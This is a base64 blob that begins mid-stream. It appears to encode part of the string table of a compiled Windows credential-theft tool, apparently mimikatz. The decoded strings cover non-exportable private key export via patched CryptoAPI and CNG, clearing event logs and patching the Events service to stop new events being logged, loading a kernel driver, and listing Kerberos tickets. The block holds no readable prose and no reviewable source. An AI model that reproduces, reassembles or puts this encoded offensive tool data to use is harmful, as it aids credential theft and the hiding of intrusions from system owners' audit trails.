AYwBjAGEAYwBoAGUAXwBlAG4AdQBtACAAOwAgAEEAdAAgAGwAZQBhAHMAdAAgAG8AbgBlACAAZgBpAGwAZQBuAGEAbQBlACAAaQBzACAAbgBlAGUAZABlAGQACgAAAAAAAAAAACUAdQAtACUAMAA4AHgALgAlAHMAAAAAAAoACQAgACAAIABTAHQAYQByAHQALwBFAG4AZAAvAE0AYQB4AFIAZQBuAGUAdwA6ACAAAAAAAAAACgAJACAAIAAgAFMAZQByAHYAaQBjAGUAIABOAGEAbQBlACAAAAAAAAoACQAgACAAIABUAGEAcgBnAGUAdAAgAE4AYQBtAGUAIAAgAAAAAAAKAAkAIAAgACAAQwBsAGkAZQBuAHQAIABOAGEAbQBlACAAIAAAAAAAIAAoACAAJQB3AFoAIAApAAAAAAAAAAAACgAJACAAIAAgAEYAbABhAGcAcwAgACUAMAA4AHgAIAAgACAAIAA6ACAAAAAAAAAACgAJACAAIAAgAFMAZQBzAHMAaQBvAG4AIABLAGUAeQAgACAAIAAgACAAIAAgADoAIAAwAHgAJQAwADgAeAAgAC0AIAAlAHMAAAAAAAAAAAAKAAkAIAAgACAAIAAgAAAACgAJACAAIAAgAFQAaQBjAGsAZQB0ACAAIAAgACAAIAAgACAAIAAgACAAIAAgADoAIAAwAHgAJQAwADgAeAAgAC0AIAAlAHMAIAA7ACAAawB2AG4AbwAgAD0AIAAlAHUAAAAAAAAAAAAJAFsALgAuAC4AXQAAAAAAbgBhAG0AZQBfAGMAYQBuAG8AbgBpAGMAYQBsAGkAegBlAAAAAAAAAG8AawBfAGEAcwBfAGQAZQBsAGUAZwBhAHQAZQAAAAAAaAB3AF8AYQB1AHQAaABlAG4AdAAAAAAAcAByAGUAXwBhAHUAdABoAGUAbgB0AAAAaQBuAGkAdABpAGEAbAAAAHIAZQBuAGUAdwBhAGIAbABlAAAAAAAAAGkAbgB2AGEAbABpAGQAAABwAG8AcwB0AGQAYQB0AGUAZAAAAAAAAABtAGEAeQBfAHAAbwBzAHQAZABhAHQAZQAAAAAAAAAAAHAAcgBvAHgAeQAAAAAAAABwAHIAbwB4AGkAYQBiAGwAZQAAAAAAAABmAG8AcgB3AGEAcgBkAGUAZAAAAAAAAABmAG8AcgB3AGEAcgBkAGEAYgBsAGUAAAAoACUAMAAyAGgAdQApACAAOgAgAAAAAAAlAHcAWgAgADsAIAAAAAAAKAAtAC0AKQAgADoAIAAAAEAAIAAlAHcAWgAAAAAAAABuAHUAbABsACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAAAAAAAAAZABlAHMAXwBwAGwAYQBpAG4AIAAgACAAIAAgACAAIAAgAAAAAAAAAGQAZQBzAF8AYwBiAGMAXwBjAHIAYwAgACAAIAAgACAAIAAAAAAAAABkAGUAcwBfAGMAYgBjAF8AbQBkADQAIAAgACAAIAAgACAAAAAAAAAAZABlAHMAXwBjAGIAYwBfAG0AZAA1ACAAIAAgACAAIAAgAAAAAAAAAGQAZQBzAF8AYwBiAGMAXwBtAGQANQBfAG4AdAAgACAAIAAAAAAAAAByAGMANABfAHAAbABhAGkAbgAgACAAIAAgACAAIAAgACAAAAAAAAAAcgBjADQAXwBwAGwAYQBpAG4AMgAgACAAIAAgACAAIAAgAAAAAAAAAHIAYwA0AF8AcABsAGEAaQBuAF8AZQB4AHAAIAAgACAAIAAAAAAAAAByAGMANABfAGwAbQAgACAAIAAgACAAIAAgACAAIAAgACAAAAAAAAAAcgBjADQAXwBtAGQANAAgACAAIAAgACAAIAAgACAAIAAgAAAAAAAAAHIAYwA0AF8AcwBoAGEAIAAgACAAIAAgACAAIAAgACAAIAAAAAAAAAByAGMANABfAGgAbQBhAGMAXwBuAHQAIAAgACAAIAAgACAAAAAAAAAAcgBjADQAXwBoAG0AYQBjAF8AbgB0AF8AZQB4AHAAIAAgAAAAAAAAAHIAYwA0AF8AcABsAGEAaQBuAF8AbwBsAGQAIAAgACAAIAAAAAAAAAByAGMANABfAHAAbABhAGkAbgBfAG8AbABkAF8AZQB4AHAAAAAAAAAAcgBjADQAXwBoAG0AYQBjAF8AbwBsAGQAIAAgACAAIAAgAAAAAAAAAHIAYwA0AF8AaABtAGEAYwBfAG8AbABkAF8AZQB4AHAAIAAAAAAAAABhAGUAcwAxADIAOABfAGgAbQBhAGMAXwBwAGwAYQBpAG4AAAAAAAAAYQBlAHMAMgA1ADYAXwBoAG0AYQBjAF8AcABsAGEAaQBuAAAAAAAAAGEAZQBzADEAMgA4AF8AaABtAGEAYwAgACAAIAAgACAAIAAAAAAAAABhAGUAcwAyADUANgBfAGgAbQBhAGMAIAAgACAAIAAgACAAAAAAAAAAdQBuAGsAbgBvAHcAIAAgACAAIAAgACAAIAAgACAAIAAgAAAAAAAAAHMAdABhAHQAdQBzAAAAAABzAGkAbgBnAGwAZQAAAAAAbwBmAGYAAAB0AGUAcwB0AAAAAAAAAAAAYgB1AHMAeQBsAGkAZwBoAHQAAAAAAAAAQgB1AHMAeQBMAGkAZwBoAHQAIABNAG8AZAB1AGwAZQAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AYgB1AHMAeQBsAGkAZwBoAHQAXwBvAGYAZgAgADsAIABOAG8AIABCAHUAcwB5AEwAaQBnAGgAdAAKAAAAAABJAE4AUABVAFQARQBWAEUATgBUAAAAAABMAEkARwBIAFQAAAAAAAAAUwBPAFUATgBEAAAAAAAAAEoASQBOAEcATABFAF8AQwBMAEkAUABTAAAAAAAAAAAAQgB1AHMAeQBMAGkAZwBoAHQAIABkAGUAdABlAGMAdABlAGQACgAAAAAAAAAAAAAACgBbACUAMwB1AF0AIAAlAHMACgAgACAAVgBlAG4AZABvAHIAOgAgADAAeAAlADAANAB4ACwAIABQAHIAbwBkAHUAYwB0ADoAIAAwAHgAJQAwADQAeAAsACAAVgBlAHIAcwBpAG8AbgA6ACAAMAB4ACUAMAA0AHgACgAgACAARABlAHMAYwByAGkAcAB0AGkAbwBuACAAIAAgADoAIAAlAHMACgAgACAAQwBhAHAAYQBiAGkAbABpAHQAaQBlAHMAIAAgADoAIAAwAHgAJQAwADIAeAAgACgAIAAAAAAAAAAlAHMALAAgAAAAAAApAAoAAAAAAAAAAAAgACAARABlAHYAaQBjAGUAIABIAGEAbgBkAGwAZQA6ACAAMAB4ACUAcAAKAAAAAAAgACAAIAAgAFMAdABhAHQAdQBzACAAIAAgACAAIAA6ACAAMAB4ACUAMAAyAHgACgAAAAAAAAAAACAAIAAgACAAUAByAG8AZAB1AGMAdABJAGQAIAAgADoAIAAlAFMACgAAAAAAAAAAACAAIAAgACAAQwBvAHMAdAB1AG0AZQByAEkAZAAgADoAIAAlAFMACgAAAAAAAAAAACAAIAAgACAATQBvAGQAZQBsACAAIAAgACAAIAAgADoAIAAlAFMACgAAAAAAAAAAACAAIAAgACAAUwBlAHIAaQBhAGwAIAAgACAAIAAgADoAIAAlAFMACgAAAAAAAAAAACAAIAAgACAATQBmAGcAXwBJAEQAIAAgACAAIAAgADoAIAAlAFMACgAAAAAAAAAAACAAIAAgACAATQBmAGcAXwBEAGEAdABlACAAIAAgADoAIAAlAFMACgAAAAAAAAAAACAAIAAgACAAcwB3AHIAZQBsAGUAYQBzAGUAIAAgADoAIAAlAFMACgAAAAAAAAAAACAAIABLAGUAZQBwAEEAbABpAHYAZQAgAFQAaAByAGUAYQBkADoAIAAwAHgAJQBwACAAKAAlAHUAIABtAHMAKQAKACAAIABXAG8AcgBrAGUAcgAgAFQAaAByAGUAYQBkACAAIAAgADoAIAAwAHgAJQBwACAAKAAlAHUAIABtAHMAKQAKAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AYgB1AHMAeQBsAGkAZwBoAHQAXwBzAHQAYQB0AHUAcwAgADsAIABOAG8AIABCAHUAcwB5AEwAaQBnAGgAdAAKAAAAAAAAAFsAJQAzAHUAXQAgACUAcwAgACgAIAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBiAHUAcwB5AGwAaQBnAGgAdABfAGwAaQBzAHQAIAA7ACAATgBvACAAQgB1AHMAeQBMAGkAZwBoAHQACgAAAHMAbwB1AG4AZAAAAAAAAABjAG8AbABvAHIAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGIAdQBzAHkAbABpAGcAaAB0AF8AcwBpAG4AZwBsAGUAIAA7ACAATgBvACAAQgB1AHMAeQBMAGkAZwBoAHQACgAAAAAAAABwAHIAbwB2AGkAZABlAHIAcwAAAAAAAABMAGkAcwB0ACAAYwByAHkAcAB0AG8AZwByAGEAcABoAGkAYwAgAHAAcgBvAHYAaQBkAGUAcgBzAAAAAAAAAAAAcwB0AG8AcgBlAHMAAAAAAEwAaQBzAHQAIABjAHIAeQBwAHQAbwBnAHIAYQBwAGgAaQBjACAAcwB0AG8AcgBlAHMAAAAAAAAAYwBlAHIAdABpAGYAaQBjAGEAdABlAHMAAAAAAAAAAABMAGkAcwB0ACAAKABvAHIAIABlAHgAcABvAHIAdAApACAAYwBlAHIAdABpAGYAaQBjAGEAdABlAHMAAAAAAAAAawBlAHkAcwAAAAAAAAAAAEwAaQBzAHQAIAAoAG8AcgAgAGUAeABwAG8AcgB0ACkAIABrAGUAeQBzACAAYwBvAG4AdABhAGkAbgBlAHIAcwAAAAAAAAAAAAAAAAAAAAAASABhAHMAaAAgAGEAIABwAGEAcwBzAHcAbwByAGQAIAB3AGkAdABoACAAbwBwAHQAaQBvAG4AYQBsACAAdQBzAGUAcgBuAGEAbQBlAAAAAABbAGUAeABwAGUAcgBpAG0AZQBuAHQAYQBsAF0AIABQAGEAdABjAGgAIABDAHIAeQBwAHQAbwBBAFAASQAgAGwAYQB5AGUAcgAgAGYAbwByACAAZQBhAHMAeQAgAGUAeABwAG8AcgB0AAAAAAAAAAAAWwBlAHgAcABlAHIAaQBtAGUAbgB0AGEAbABdACAAUABhAHQAYwBoACAAQwBOAEcAIABzAGUAcgB2AGkAYwBlACAAZgBvAHIAIABlAGEAcwB5ACAAZQB4AHAAbwByAHQAAAAAAAAAAABjAHIAeQBwAHQAbwAAAAAAQwByAHkAcAB0AG8AIABNAG8AZAB1AGwAZQAAAAAAAAByAHMAYQBlAG4AaAAAAAAAQ1BFeHBvcnRLZXkAAAAAAG4AYwByAHkAcAB0AAAAAABOQ3J5cHRPcGVuU3RvcmFnZVByb3ZpZGVyAAAAAAAAAE5DcnlwdEVudW1LZXlzAABOQ3J5cHRPcGVuS2V5AAAATkNyeXB0SW1wb3J0S2V5AE5DcnlwdEV4cG9ydEtleQBOQ3J5cHRHZXRQcm9wZXJ0eQAAAAAAAABOQ3J5cHRTZXRQcm9wZXJ0eQAAAAAAAABOQ3J5cHRGcmVlQnVmZmVyAAAAAAAAAABOQ3J5cHRGcmVlT2JqZWN0AAAAAAAAAABCQ3J5cHRFbnVtUmVnaXN0ZXJlZFByb3ZpZGVycwAAAEJDcnlwdEZyZWVCdWZmZXIAAAAAAAAAAAoAQwByAHkAcAB0AG8AQQBQAEkAIABwAHIAbwB2AGkAZABlAHIAcwAgADoACgAAACUAMgB1AC4AIAAlAHMACgAAAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBjAHIAeQBwAHQAbwBfAGwAXwBwAHIAbwB2AGkAZABlAHIAcwAgADsAIABDAHIAeQBwAHQARQBuAHUAbQBQAHIAbwB2AGkAZABlAHIAcwAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAKAEMATgBHACAAcAByAG8AdgBpAGQAZQByAHMAIAA6AAoAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGMAcgB5AHAAdABvAF8AbABfAHAAcgBvAHYAaQBkAGUAcgBzACAAOwAgAEIAQwByAHkAcAB0AEUAbgB1AG0AUgBlAGcAaQBzAHQAZQByAGUAZABQAHIAbwB2AGkAZABlAHIAcwAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAEMAVQBSAFIARQBOAFQAXwBVAFMARQBSAAAAAAAAAAAAcwB5AHMAdABlAG0AcwB0AG8AcgBlAAAAQQBzAGsAaQBuAGcAIABmAG8AcgAgAFMAeQBzAHQAZQBtACAAUwB0AG8AcgBlACAAJwAlAHMAJwAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGMAcgB5AHAAdABvAF8AbABfAHMAdABvAHIAZQBzACAAOwAgAEMAZQByAHQARQBuAHUAbQBTAHkAcwB0AGUAbQBTAHQAbwByAGUAIAAoADAAeAAlADAAOAB4ACkACgAAAAAATQB5AAAAAAAAAAAAcwB0AG8AcgBlAAAAAAAAAAAAAAAAAAAAIAAqACAAUwB5AHMAdABlAG0AIABTAHQAbwByAGUAIAAgADoAIAAnACUAcwAnACAAKAAwAHgAJQAwADgAeAApAAoAIAAqACAAUwB0AG8AcgBlACAAIAAgACAAIAAgACAAIAAgADoAIAAnACUAcwAnAAoACgAAAAAAKABuAHUAbABsACkAAAAAAAAAAAAAAAAACQBLAGUAeQAgAEMAbwBuAHQAYQBpAG4AZQByACAAIAA6ACAAJQBzAAoACQBQAHIAbwB2AGkAZABlAHIAIAAgACAAIAAgACAAIAA6ACAAJQBzAAoAAAAAAAkAVAB5AHAAZQAgACAAIAAgACAAIAAgACAAIAAgACAAOgAgACUAcwAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBsAF8AYwBlAHIAdABpAGYAaQBjAGEAdABlAHMAIAA7ACAAQwByAHkAcAB0AEcAZQB0AFUAcwBlAHIASwBlAHkAIAAoADAAeAAlADAAOAB4ACkACgAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBjAHIAeQBwAHQAbwBfAGwAXwBjAGUAcgB0AGkAZgBpAGMAYQB0AGUAcwAgADsAIABrAGUAeQBTAHAAZQBjACAAPQA9ACAAQwBFAFIAVABfAE4AQwBSAFkAUABUAF8ASwBFAFkAXwBTAFAARQBDACAAdwBpAHQAaABvAHUAdAAgAEMATgBHACAASABhAG4AZABsAGUAIAA/AAoAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBjAHIAeQBwAHQAbwBfAGwAXwBjAGUAcgB0AGkAZgBpAGMAYQB0AGUAcwAgADsAIABDAHIAeQBwAHQAQQBjAHEAdQBpAHIAZQBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAUAByAGkAdgBhAHQAZQBLAGUAeQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGMAcgB5AHAAdABvAF8AbABfAGMAZQByAHQAaQBmAGkAYwBhAHQAZQBzACAAOwAgAEMAZQByAHQARwBlAHQAQwBlAHIAdABpAGYAaQBjAGEAdABlAEMAbwBuAHQAZQB4AHQAUAByAG8AcABlAHIAdAB5ACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBsAF8AYwBlAHIAdABpAGYAaQBjAGEAdABlAHMAIAA7ACAAQwBlAHIAdABHAGUAdABOAGEAbQBlAFMAdAByAGkAbgBnACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBsAF8AYwBlAHIAdABpAGYAaQBjAGEAdABlAHMAIAA7ACAAQwBlAHIAdABHAGUAdABOAGEAbQBlAFMAdAByAGkAbgBnACAAKABmAG8AcgAgAGwAZQBuACkAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGMAcgB5AHAAdABvAF8AbABfAGMAZQByAHQAaQBmAGkAYwBhAHQAZQBzACAAOwAgAEMAZQByAHQATwBwAGUAbgBTAHQAbwByAGUAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAHAAcgBvAHYAaQBkAGUAcgAAAAAAAAAAAHAAcgBvAHYAaQBkAGUAcgB0AHkAcABlAAAAAAAAAAAAAAAAAAAAAABNAGkAYwByAG8AcwBvAGYAdAAgAFMAbwBmAHQAdwBhAHIAZQAgAEsAZQB5ACAAUwB0AG8AcgBhAGcAZQAgAFAAcgBvAHYAaQBkAGUAcgAAAGMAbgBnAHAAcgBvAHYAaQBkAGUAcgAAAAAAAAAAAAAAIAAqACAAUwB0AG8AcgBlACAAIAAgACAAIAAgACAAIAAgADoAIAAnACUAcwAnAAoAIAAqACAAUAByAG8AdgBpAGQAZQByACAAIAAgACAAIAAgADoAIAAnACUAcwAnACAAKAAnACUAcwAnACkACgAgACoAIABQAHIAbwB2AGkAZABlAHIAIAB0AHkAcABlACAAOgAgACcAJQBzACcAIAAoACUAdQApAAoAIAAqACAAQwBOAEcAIABQAHIAbwB2AGkAZABlAHIAIAAgADoAIAAnACUAcwAnAAoAAAAAAAAAAAAKAEMAcgB5AHAAdABvAEEAUABJACAAawBlAHkAcwAgADoACgAAAAAACgAlADIAdQAuACAAJQBzAAoAAAAAAAAAIAAgACAAIAAlAFMACgAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBsAF8AawBlAHkAcwAgADsAIABDAHIAeQBwAHQARwBlAHQAVQBzAGUAcgBLAGUAeQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGMAcgB5AHAAdABvAF8AbABfAGsAZQB5AHMAIAA7ACAAQwByAHkAcAB0AEcAZQB0AFAAcgBvAHYAUABhAHIAYQBtACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAAAKAEMATgBHACAAawBlAHkAcwAgADoACgAAAAAAAAAAAFUAbgBpAHEAdQBlACAATgBhAG0AZQAAACAAIAAgACAAJQBzAAoAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGMAcgB5AHAAdABvAF8AbABfAGsAZQB5AHMAIAA7ACAATgBDAHIAeQBwAHQATwBwAGUAbgBLAGUAeQAgACUAMAA4AHgACgAAAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBjAHIAeQBwAHQAbwBfAGwAXwBrAGUAeQBzACAAOwAgAE4AQwByAHkAcAB0AEUAbgB1AG0ASwBlAHkAcwAgACUAMAA4AHgACgAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBsAF8AawBlAHkAcwAgADsAIABOAEMAcgB5AHAAdABPAHAAZQBuAFMAdABvAHIAYQBnAGUAUAByAG8AdgBpAGQAZQByACAAJQAwADgAeAAKAAAAAAAAAAAARQB4AHAAbwByAHQAIABQAG8AbABpAGMAeQAAAAAAAABMAGUAbgBnAHQAaAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBjAHIAeQBwAHQAbwBfAHAAcgBpAG4AdABLAGUAeQBJAG4AZgBvAHMAIAA7ACAATgBDAHIAeQBwAHQARwBlAHQAUAByAG8AcABlAHIAdAB5ACAAKAAwAHgAJQAwADgAeAApAAoAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGMAcgB5AHAAdABvAF8AcAByAGkAbgB0AEsAZQB5AEkAbgBmAG8AcwAgADsAIABDAHIAeQBwAHQARwBlAHQASwBlAHkAUABhAHIAYQBtACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAFkARQBTAAAATgBPAAAAAAAJAEUAeABwAG8AcgB0AGEAYgBsAGUAIABrAGUAeQAgADoAIAAlAHMACgAJAEsAZQB5ACAAcwBpAHoAZQAgACAAIAAgACAAIAAgADoAIAAlAHUACgAAAAAAUgBTAEEAUABSAEkAVgBBAFQARQBCAEwATwBCAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBlAHgAcABvAHIAdABSAGEAdwBLAGUAeQBUAG8ARgBpAGwAZQAgADsAIABOAEMAcgB5AHAAdABTAGUAdABQAHIAbwBwAGUAcgB0AHkACgAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBjAHIAeQBwAHQAbwBfAGUAeABwAG8AcgB0AFIAYQB3AEsAZQB5AFQAbwBGAGkAbABlACAAOwAgAE4AQwByAHkAcAB0AEkAbQBwAG8AcgB0AEsAZQB5AAoAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGMAcgB5AHAAdABvAF8AZQB4AHAAbwByAHQAUgBhAHcASwBlAHkAVABvAEYAaQBsAGUAIAA7ACAATgBvACAAQwBOAEcAIQAKAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBjAHIAeQBwAHQAbwBfAGUAeABwAG8AcgB0AFIAYQB3AEsAZQB5AFQAbwBGAGkAbABlACAAOwAgAEMAcgB5AHAAdABJAG0AcABvAHIAdABLAGUAeQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAEMAQQBQAEkAUABSAEkAVgBBAFQARQBCAEwATwBCAAAATwBLAAAAAABLAE8AAAAAAAkAUAByAGkAdgBhAHQAZQAgAGUAeABwAG8AcgB0ACAAOgAgACUAcwAgAC0AIAAAACcAJQBzACcACgAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBlAHgAcABvAHIAdABLAGUAeQBUAG8ARgBpAGwAZQAgADsAIABFAHgAcABvAHIAdAAgAC8AIABDAHIAZQBhAHQAZQBGAGkAbABlACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBlAHgAcABvAHIAdABLAGUAeQBUAG8ARgBpAGwAZQAgADsAIABrAHUAaABsAF8AbQBfAGMAcgB5AHAAdABvAF8AZwBlAG4AZQByAGEAdABlAEYAaQBsAGUATgBhAG0AZQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAABkAGUAcgAAAAkAUAB1AGIAbABpAGMAIABlAHgAcABvAHIAdAAgACAAOgAgACUAcwAgAC0AIAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBjAHIAeQBwAHQAbwBfAGUAeABwAG8AcgB0AEMAZQByAHQAIAA7ACAAQwByAGUAYQB0AGUARgBpAGwAZQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBlAHgAcABvAHIAdABDAGUAcgB0ACAAOwAgAGsAdQBoAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBnAGUAbgBlAHIAYQB0AGUARgBpAGwAZQBOAGEAbQBlACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAcABmAHgAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGMAcgB5AHAAdABvAF8AZQB4AHAAbwByAHQAQwBlAHIAdAAgADsAIABFAHgAcABvAHIAdAAgAC8AIABDAHIAZQBhAHQAZQBGAGkAbABlACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBlAHgAcABvAHIAdABQAGYAeAAgADsAIABQAEYAWABFAHgAcABvAHIAdABDAGUAcgB0AFMAdABvAHIAZQBFAHgAIAAoADAAeAAlADAAOAB4ACkACgAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBjAHIAeQBwAHQAbwBfAEQAZQByAEEAbgBkAEsAZQB5AFQAbwBQAGYAeAAgADsAIABDAHIAeQBwAHQASQBtAHAAbwByAHQASwBlAHkAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGMAcgB5AHAAdABvAF8ARABlAHIAQQBuAGQASwBlAHkAVABvAFAAZgB4ACAAOwAgAFUAbgBhAGIAbABlACAAdABvACAAZABlAGwAZQB0AGUAIAB0AGUAbQBwACAAawBlAHkAcwBlAHQAIAAlAHMACgAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGMAcgB5AHAAdABvAF8ARABlAHIAQQBuAGQASwBlAHkAVABvAFAAZgB4ACAAOwAgAEMAcgB5AHAAdABBAGMAcQB1AGkAcgBlAEMAbwBuAHQAZQB4AHQAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGMAcgB5AHAAdABvAF8ARABlAHIAQQBuAGQASwBlAHkAVABvAFAAZgB4ACAAOwAgAEMAZQByAHQAQQBkAGQARQBuAGMAbwBkAGUAZABDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVABvAFMAdABvAHIAZQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAJQBzAF8AJQBzAF8AJQB1AF8AJQBzAC4AJQBzAAAAAABOAFQATABNADoAIAAAAAAARABDAEMAMQA6ACAAAAAAAEQAQwBDADIAOgAgAAAAAABMAE0AIAAgADoAIAAAAAAATQBEADUAIAA6ACAAAAAAAFMASABBADEAOgAgAAAAAABTAEgAQQAyADoAIAAAAAAAcgBzAGEAZQBuAGgALgBkAGwAbAAAAAAATABvAGMAYQBsACAAQwByAHkAcAB0AG8AQQBQAEkAIABwAGEAdABjAGgAZQBkAAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGMAcgB5AHAAdABvAF8AcABfAGMAYQBwAGkAIAA7ACAAawB1AGwAbABfAG0AXwBwAGEAdABjAGgAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBjAHIAeQBwAHQAbwBfAHAAXwBjAGEAcABpACAAOwAgAGsAdQBsAGwAXwBtAF8AcAByAG8AYwBlAHMAcwBfAGcAZQB0AFYAZQByAHkAQgBhAHMAaQBjAE0AbwBkAHUAbABlAEkAbgBmAG8AcgBtAGEAdABpAG8AbgBzAEYAbwByAE4AYQBtAGUAIAAoADAAeAAlADAAOAB4ACkACgAAAG4AYwByAHkAcAB0AC4AZABsAGwAAAAAAG4AYwByAHkAcAB0AHAAcgBvAHYALgBkAGwAbAAAAAAASwBlAHkASQBzAG8AAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBwAF8AYwBuAGcAIAA7ACAATgBvACAAQwBOAEcACgAAAGQAcgBvAHAAAAAAAAAAAAAAAAAAAAAAAFsAZQB4AHAAZQByAGkAbQBlAG4AdABhAGwAXQAgAHAAYQB0AGMAaAAgAEUAdgBlAG4AdABzACAAcwBlAHIAdgBpAGMAZQAgAHQAbwAgAGEAdgBvAGkAZAAgAG4AZQB3ACAAZQB2AGUAbgB0AHMAAABjAGwAZQBhAHIAAAAAAAAAQwBsAGUAYQByACAAYQBuACAAZQB2AGUAbgB0ACAAbABvAGcAAAAAAGUAdgBlAG4AdAAAAAAAAABFAHYAZQBuAHQAIABtAG8AZAB1AGwAZQAAAAAAAAAAAGUAdgBlAG4AdABsAG8AZwAuAGQAbABsAAAAAAAAAAAAdwBlAHYAdABzAHYAYwAuAGQAbABsAAAARQB2AGUAbgB0AEwAbwBnAAAAAAAAAAAAUwBlAGMAdQByAGkAdAB5AAAAAAAAAAAAbABvAGcAAABVAHMAaQBuAGcAIAAiACUAcwAiACAAZQB2AGUAbgB0ACAAbABvAGcAIAA6AAoAAAAtACAAJQB1ACAAZQB2AGUAbgB0ACgAcwApAAoAAAAAAC0AIABDAGwAZQBhAHIAZQBkACAAIQAKAAAAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGUAdgBlAG4AdABfAGMAbABlAGEAcgAgADsAIABDAGwAZQBhAHIARQB2AGUAbgB0AEwAbwBnACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBlAHYAZQBuAHQAXwBjAGwAZQBhAHIAIAA7ACAATwBwAGUAbgBFAHYAZQBuAHQATABvAGcAIAAoADAAeAAlADAAOAB4ACkACgAAACsAAAAAAAAAAAAAAEkAbgBzAHQAYQBsAGwAIABhAG4AZAAvAG8AcgAgAHMAdABhAHIAdAAgAG0AaQBtAGkAawBhAHQAegAgAGQAcgBpAHYAZQByACAAKABtAGkAbQBpAGQAcgB2ACkAAAAAAC0AAAAAAAAAAAAAAAAAAABSAGUAbQBvAHYAZQAgAG0AaQBtAGkAawBhAHQAegAgAGQAcgBpAHYAZQByACAAKABtAGkAbQBpAGQAcgB2ACkAAAAAAAAAAABwAGkAbgBnAAAAAAAAAAAAUABpAG4AZwAgAHQAaABlACAAZAByAGkAdgBlAHIAAABiAHMAbwBkAAAAAAAAAAAAQgBTAE8ARAAgACEAAAAAAHAAcgBvAGMAZQBzAHMAAABMAGkAcwB0ACAAcAByAG8AYwBlAHMAcwAAAAAAAAAAAHAAcgBvAGMAZQBzAHMAUAByAG8AdABlAGMAdAAAAAAAUAByAG8AdABlAGMAdAAgAHAAcgBvAGMAZQBzAHMAAABwAHIAbwBjAGUAcwBzAFQA